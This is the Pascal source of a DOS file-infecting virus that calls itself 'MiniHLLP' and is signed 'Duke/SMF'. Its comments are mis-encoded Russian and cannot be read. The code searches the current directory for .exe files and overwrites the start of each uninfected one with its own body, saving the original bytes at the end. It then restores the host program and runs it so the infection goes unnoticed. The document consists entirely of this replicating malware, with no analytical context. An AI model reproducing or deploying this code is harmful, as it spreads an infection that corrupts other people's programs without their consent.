   {$I-,S-}
   {$M 5000, 0, 5000}
   program Mini_HLLP;
   uses dos;
   const Len=4336;                    {„«¨  ¯à®£à ¬¬ë}
   var a,b:file;                      {"€"-¨áå®¤ë©, "‚"-®¢ë©}
       n:searchrec;
       w,v:array[1..Len] of byte;     {V-¢¨àãá, W-¢á¯®¬®£ â¥«ìë©}
   {--------------------------------------------------------------------------}
   procedure Execute;                 {‡ ¯ãáª ¨ «¥ç¥¨¥ ä ©« }
   var par:string;
       i:byte;
       f:integer;
       s:string;                      {§ ¯ãé¥ë© ä ©«}
   begin
   s:=paramstr(0);
   assign(a,s);reset(a,1);
   BlockRead(a,v,Len);                {‘ç¨â «¨ ¢¨àãá ¢ ¯ ¬ïâì}
   f:=filesize(a);
   if f<=Len then Exit;               {…á«¨ ¬ë ¢ ç¨áâ®¬ ¢¨àãá¥ -   ¢ëå®¤}
   {‚®§¢à é ¥¬ ¦¥àâ¢¥ "€" ¯¥à¢® ç «ìë© ¢¨¤:}
   seek(a,f-Len);                     {“ª § â¥«ì ¯®áâ ¢«¥    ç «® save-"€".}
   BlockRead(a,w,Len);                {Save-"A" áç¨â  ¢ ¬ áá¨¢ W.}
   seek(a,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "€".}
   BlockWrite(a,w,Len);               {Œ áá¨¢ W § ¯¨á  ¢  ç «® "€".}
   seek(a,f-Len);                     {“ª § â¥«ì ¯®áâ ¢«¥    ç «® save-"€".}
   truncate(a);                       {Žâ¡à áë¢ ¥âáï save-ç áâì "€".}
   close(a);                          {‡ ªàë¢ ¥¬ "€"}
   for i:=1 to paramcount do          {‘®åà ï¥¬ ¯ à ¬¥âàë}
     par:=par+paramstr(i)+' ';
   exec(s,par);                       {‡ ¯ãáª ¥¬ "€"}
   end;
   {--------------------------------------------------------------------------}
   procedure Infect;                  {*à®æ¥¤ãà  § à ¦¥¨ï ä ©« }
   begin
   {assign(b,st);reset(b,1);}         {” ©« "B" ã¦¥ ®âªàëâ ¯à¨ ¯à®¢¥àª¥}
   setfattr(b,$20);
   {‘®åà ¥¨¥  ç «  "‚" :}
   seek(b,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "‚".}
   BlockRead(b,w,Len);                {* ç «® "‚" áç¨â ® ¢ ¬ áá¨¢ W.}
   seek(b,filesize(b));               {“ª § â¥«ì ¯®áâ ¢«¥   ª®¥æ "‚".}
   BlockWrite(b,w,Len);               {Œ áá¨¢ W § ¯¨á  ¢ ª®¥æ "‚".}
   {‡ ¯¨áì ®¢®£®  ç «  "‚" :}
   seek(b,0);                         {“ª § â¥«ì ¯®áâ ¢«¥    ç «® "‚".}
   BlockWrite(b,v,Len);               {*¨è¥¬ V ¢  ç «® "‚".}
   close(b);                          {‡ ªàë¢ ¥¬ "‚".}
   end;
   {--------------------------------------------------------------------------}
   procedure check(st:string);        {¯à®¢¥àª    § à ¦¥®áâì}
   var c,d:byte;
   begin
   assign(b,st);reset(b,1);
   seek(b,filesize(b)-len);
   blockread(b,c,1);blockread(b,d,1);
   if (c<>ord('M')) or (d<>ord('Z')) then Infect else close(b);
   end;
   {-------------------------------------------------------------------------}
   begin
   asm
     jmp @lab
     db 'MiniHLLP (c) by Duke/SMF'
   @lab:
   end;
   Execute;                           {‡ ¯ãáª ¦¥àâ¢ë}
   findfirst('*.exe',$21,n);          {*®¨áª ¯®¤å®¤ïé¥£® ä ©« :}
   while doserror=0 do
     begin
     if n.size>Len then check(n.name);{…á«¨ ¤«¨  > ¤«¨ë ¢¨àãá }
     findnext(n);
     end;
   end.
